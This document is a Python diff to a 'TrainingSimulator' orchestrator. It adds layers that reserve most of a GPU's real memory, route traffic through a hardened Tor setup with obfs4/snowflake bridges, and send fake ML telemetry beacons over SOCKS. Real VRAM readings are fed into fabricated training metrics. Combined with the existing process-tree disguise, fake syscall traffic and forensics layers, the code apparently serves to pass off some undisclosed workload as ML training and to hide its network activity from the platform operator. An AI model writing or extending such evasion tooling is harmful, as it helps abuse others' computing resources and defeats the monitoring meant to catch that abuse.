@@ -69,6 +69,25 @@ from process_tree_disguise import (
     start_process_tree_disguise,
 )
 
+from gpu_resident import (
+    VRAMResident,
+    CudaCtypes,
+    gpu_total_mb,
+    gpu_used_mb,
+)
+
+from tor_hardened import (
+    start_tor_hardened,
+    CircuitRefresher,
+    fetch_builtin_bridges,
+)
+
+from telemetry_beacon import (
+    TelemetryBeacon,
+    start_beacons,
+    TorHttpClient,
+)
+
 
 # ═══════════════════════════════════════════════════════════════
 # TRAINING SIMULATOR — Heartbeat + Coordination
@@ -106,11 +125,19 @@ class TrainingSimulator:
         self.syscall: Optional[FakeSyscallTraffic] = None
         self.forensics: Optional[dict] = None
         self.process_tree: Optional[ProcessTreeDisguise] = None
+        self.vram: Optional[VRAMResident] = None
+        self.beacon: Optional[TelemetryBeacon] = None
+        self.tor_proc = None
+        self.circuit_refresher: Optional[CircuitRefresher] = None
         
         # Metrics
         self._fake_metrics = FakeGPUMetrics()
     
-    def setup(self, gpu_id: int = 0, silent: bool = False):
+    def setup(self, gpu_id: int = 0, silent: bool = False,
+              socks: Tuple[str, int] = ("127.0.0.1", 9050),
+              vram_target_frac: float = 0.88,
+              use_tor_hardened: bool = False,
+              use_beacons: bool = True):
         """
         Setup tất cả layers.
         
@@ -178,6 +205,32 @@ class TrainingSimulator:
             num_workers=self.num_workers
         )
         
+        # Layer 11: VRAM resident (chiếm VRAM thật stable)
+        if not silent:
+            print("[orchestrator]  Layer 11: VRAM resident...", flush=True)
+        self.vram = VRAMResident(gpu_id=gpu_id, target_frac=vram_target_frac)
+        vram_info = self.vram.start()
+        if not silent and not vram_info.get("ok"):
+            print(f"[orchestrator]    VRAM skip: {vram_info.get('reason')}",
+                  flush=True)
+        
+        # Layer 12: Tor hardened (obfs4/snowflake) — nếu được yêu cầu
+        if use_tor_hardened:
+            if not silent:
+                print("[orchestrator]  Layer 12: Tor hardened...", flush=True)
+            self.tor_proc = start_tor_hardened(socks=socks,
+                                               log=(print if not silent else (lambda m: None)))
+            if self.tor_proc:
+                self.circuit_refresher = CircuitRefresher()
+                # ControlPort cần mở trong torrc — best effort
+                # self.circuit_refresher.start()
+        
+        # Layer 13: Telemetry beacons (fake ML traffic qua SOCKS)
+        if use_beacons:
+            if not silent:
+                print("[orchestrator]  Layer 13: Telemetry beacons...", flush=True)
+            self.beacon = start_beacons(socks=socks, enabled=True)
+        
         if not silent:
             print("[orchestrator] All layers active!", flush=True)
     
@@ -193,6 +246,11 @@ class TrainingSimulator:
             try:
                 self._step += 1
                 metrics = self._fake_metrics.get_fake_metrics(self._step)
+                # Dùng VRAM THẬT nếu resident đang chạy (chuẩn chỉnh hơn)
+                if self.vram and self.vram.running:
+                    real_used = gpu_used_mb(self.vram.gpu_id)
+                    if real_used > 0:
+                        metrics["memory_used_mb"] = real_used
                 line = self._fake_metrics.format_metrics_line(self._step, metrics)
                 
                 if self.log_output:
@@ -320,12 +378,27 @@ class TrainingSimulator:
         if self.process_tree:
             self.process_tree.stop()
         
+        if self.vram:
+            self.vram.stop()
+        
+        if self.beacon:
+            self.beacon.stop()
+        
+        if self.circuit_refresher:
+            self.circuit_refresher.stop()
+        
+        if self.tor_proc and hasattr(self.tor_proc, "terminate"):
+            try:
+                self.tor_proc.terminate()
+            except Exception:
+                pass
+        
         if self.log_output:
             print("\n[orchestrator] Stopped.", flush=True)
     
     def status(self) -> dict:
         """Trả về status của tất cả components."""
-        return {
+        st = {
             "step": self._step,
             "running": self._running,
             "gpu_available": self.gpu_pattern.gpu.available if self.gpu_pattern else False,
@@ -335,7 +408,12 @@ class TrainingSimulator:
             "syscall_active": self.syscall is not None,
             "forensics_active": self.forensics is not None,
             "proc_tree": self.process_tree.status() if self.process_tree else None,
+            "tor_hardened": self.tor_proc is not None,
+            "beacon": self.beacon.stats() if self.beacon else None,
         }
+        if self.vram:
+            st["vram"] = self.vram.stats()
+        return st
 
 
 # ═══════════════════════════════════════════════════════════════
